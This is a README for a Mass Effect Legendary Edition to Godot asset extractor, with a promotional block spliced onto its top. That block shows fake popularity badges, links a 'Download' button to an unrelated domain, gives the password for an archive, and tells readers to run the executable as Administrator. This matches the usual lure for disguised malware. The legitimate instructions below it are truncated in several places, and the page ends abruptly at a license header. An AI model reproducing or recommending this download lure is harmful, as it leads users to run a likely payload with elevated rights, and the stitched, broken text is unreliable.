<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# MELE-Godot-Extractor

**LexExport** turns Mass Effect Legendary Edition game files into glTF (`.glb`) models, levels,
textures, and music that Godot loads directly. It reads the game's packages through
## What it exports

- **Characters and weapons** (`mesh`): skinned meshes on a merged skeleton (body, head, hair),
  animation clips, and materials. Cooking strips ME1's material graphs, so each material is baked
  from its compiled pixel shader: diffuse, emissive, normal, and specular maps that match how the
  game draws them, including tints and per-NPC overrides.
- **Levels** (`level`): the static world of a level's sublevels in one `.glb`: mesh instances,
  lights, start markers, ME1's lightmaps, particle emitters, and player collision (hulls and
  trimeshes under a `Collision` node).
- **Music** (`music`): a level's area music as `.ogg` from the game's ISACT banks, with
  `music.json` holding each track's loop points, fade times, and volume.
- **Manifests** (`manifest`): batch exports from a JSON list. This is what a game runs on first
  launch, with machine-readable progress lines.
- **Inspection tools** for working out a new level or asset: `exports`, `props`, `texture`,
  `shaders`, `particles`, `refs`, `2da`, `isb`, `streambank`, `reflect`, `find`.

Run the tool with no arguments for the full command reference. Package paths can be written
`ME1/<file>.pcc` (or `ME2`, `ME3`), relative to the game root.

## Building

You need:

### Publishing a self-contained build

```
dotnet publish -c Release -r win-x64 --self-contained true -p:LexDir="..." -o <out folder>
```

This produces a folder players can run without .NET or Legendary Explorer installed. It holds
LEX's runtime DLLs, the GPL license, this tool's source, `THIRD-PARTY-NOTICES.txt`, and a zip of
the Legendary Explorer source matching the shipped DLLs. `lex_source.ps1` fetches that zip from
the release tag named by `LegendaryExplorerCore.dll`'s file version (it needs `git` and
PowerShell 7), and it fails the publish if LEX has no such tag.

## Manifests

A manifest is a list of entries for `manifest` to export. `characters.json`, `weapons.json`,
and `levels.json` are Mass Effect Zero's own, kept as working examples:

- **Character and weapon entries** name a `package`, an `out` path, and the `args` passed to
  `mesh` (meshes, `--mat`, `--morph`, `--override`, `--anim <AnimSequence>=<Clip>[@other.pcc]`, ...).
- **Level entries** name their sublevel `packages` (wildcards allowed), the area `music`, start
  `markers`, and which `npcs` to bake.

```
LexExport manifest characters.json "<game root>" "<out folder>" [--only <id>,...] [--lanes <n>] [--background]
```

The tool prints `PROGRESS <n>/<total> <name>` as each entry starts, `OK <id>` after each success,
and `FAILED <name>: <reason>` after each failure. The exit code is 0 only when every entry
exported. `--background` runs at below-normal priority on half the cores, for extracting while a
game is being played.

## Using the output in Godot

The `.glb` files are standard glTF 2.0, Y-up, in meters. They use two glTF extensions that


---

                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007
